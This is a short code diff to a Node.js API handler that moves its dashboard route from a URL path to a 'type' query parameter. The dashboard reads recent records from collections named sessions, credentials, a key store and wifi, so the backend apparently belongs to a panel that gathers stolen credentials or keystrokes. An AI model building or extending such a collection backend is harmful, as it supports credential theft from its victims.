@@ -59,6 +59,7 @@ module.exports = async (req, res) => {
 
     const url = new URL(req.url, `http://${req.headers.host}`);
     const path = url.pathname.replace('/api/', '');
+    const typeQuery = url.searchParams.get('type');
     const ip = getClientIP(req);
 
     try {
@@ -252,7 +253,7 @@ module.exports = async (req, res) => {
         }
 
         // ========== GET DATA FOR DASHBOARD ==========
-        else if (req.method === 'GET' && path === 'dashboard_data') {
+        else if (req.method === 'GET' && typeQuery === 'dashboard_data') {
             const [sessionsSnap, credsSnap, keySnap, wifiSnap] = await Promise.all([
                 db.collection('sessions').orderBy('last_seen', 'desc').limit(50).get(),
                 db.collection('credentials').orderBy('timestamp', 'desc').limit(100).get(),
